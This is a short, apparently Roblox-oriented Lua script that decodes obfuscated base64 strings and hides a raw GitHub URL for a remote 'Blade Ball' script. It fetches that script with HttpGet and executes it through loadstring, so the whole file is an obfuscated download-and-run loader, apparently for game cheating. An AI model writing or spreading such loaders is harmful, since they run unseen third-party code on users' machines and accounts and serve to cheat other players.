local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function RIYMfraKlUqeqArQnQAGxTzoyDizzSRcBTzNFMZhCUpgTBKILPsSvoJrgSZETqHzF(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 


local url = RIYMfraKlUqeqArQnQAGxTzoyDizzSRcBTzNFMZhCUpgTBKILPsSvoJrgSZETqHzF('rOXPkwQIOUWihUKZwNUtPEMrRAiGbdWPOWAqYiiSmyJruyxrwfqnrICaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1NveUFkcmlZVC9Bc3Ryb1gvbWFpbi9HYW1lcy9CbGFkZSUyMEJhbGwubHVh')

local function executeScript()
    local success, result = pcall(function()
        local scriptContent = game:HttpGet(url, true)
        loadstring(scriptContent)()
    end)

    if not success then
        warn(RIYMfraKlUqeqArQnQAGxTzoyDizzSRcBTzNFMZhCUpgTBKILPsSvoJrgSZETqHzF('sRVTzEmmsNTIHnYULyPaZHAQuIjzLzycNjuZhHhAMAXjjNLJKTChrRQRmFpbGVkIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4gRXJyb3I6IA==') .. tostring(result))
    end
end

executeScript()
    
